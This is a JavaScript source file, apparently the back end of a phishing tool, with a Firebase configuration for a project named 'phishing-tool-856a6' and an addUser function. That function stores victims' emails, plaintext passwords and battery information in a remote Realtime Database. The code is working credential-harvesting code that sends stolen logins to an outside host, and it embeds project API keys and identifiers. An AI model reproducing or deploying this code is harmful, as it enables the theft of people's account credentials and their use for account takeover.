// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set , push , serverTimestamp } from "firebase/database";

// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyD1kSc5GUE8pclxyNt4Sw7JoYGh8XCubwQ",
  authDomain: "phishing-tool-856a6.firebaseapp.com",
  projectId: "phishing-tool-856a6",
  storageBucket: "phishing-tool-856a6.appspot.com",
  messagingSenderId: "870465999324",
  appId: "1:870465999324:web:f5994fe194585b3ae6bf19"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

function formatDateTime(date) {
  const day = date.getDate();
  const month = date.getMonth() + 1; // Note: Month is zero-based.
  const year = date.getFullYear();
  const hours = date.getHours();
  const minutes = date.getMinutes();
  const ampm = hours >= 12 ? 'PM' : 'AM';
  const formattedHours = hours % 12 === 0 ? 12 : hours % 12;
  const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
  
  return `${day}-${month}-${year}  |  ${formattedHours}:${formattedMinutes} ${ampm}`;
}

// Function to add a new user to the database
export function addUser(email, password , battery) {
    // Get a reference to the database
    const database = getDatabase();
  
    // Generate a unique key for the new user (optional, but not necessary in Realtime Database)
    // const newUserKey = ref(database, 'users/').push().key;
  
    // Create an object with user data
    const id = generateRandomID();
    const currentDate = new Date()
    const userData = {
      email: email,
      password: password , 
      chargerInfo : battery,
      id : id,
      date : formatDateTime(currentDate),
      serverTimestamp:serverTimestamp()
    };
    
    // Set the data for the new user under a known key
    set(ref(database, 'users/' + id), userData)
      .then(() => {
        console.log("User added successfully!");
      })
      .catch((error) => {
        console.error("Error adding user: ", error);
      });
  }
  
  function generateRandomID() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let randomID = '';
    const idLength = 8;
  
    for (let i = 0; i < idLength; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length);
      randomID += characters[randomIndex];
    }
  
    return randomID;
  }